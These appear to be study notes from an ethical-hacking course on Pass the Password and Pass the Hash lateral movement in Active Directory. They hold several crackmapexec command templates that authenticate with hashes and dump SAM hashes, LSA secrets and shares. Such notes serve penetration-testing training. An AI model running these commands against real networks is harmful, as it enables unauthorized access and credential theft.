___
## Pass the Password / Pass the Hash

- If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks

![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%208%20-%20Attacking%20Active%20Directory%20-%20Post%20Compromise%20Attacks/assests/Pasted%20image%2020251114161232.png)
```
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>
```

![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%208%20-%20Attacking%20Active%20Directory%20-%20Post%20Compromise%20Attacks/assests/-20251114.png)

```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth
```

- CME to dump valuable data

![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%208%20-%20Attacking%20Active%20Directory%20-%20Post%20Compromise%20Attacks/assests/-20251114-1.png)

```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam
```

![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%208%20-%20Attacking%20Active%20Directory%20-%20Post%20Compromise%20Attacks/assests/-20251114-2.png)

```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --shares
```

![](Courses/TCM%20Practical%20Ethical%20Hacking/Domain%208%20-%20Attacking%20Active%20Directory%20-%20Post%20Compromise%20Attacks/assests/-20251114-3.png)

```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --lsa
```

### Built-in Modules


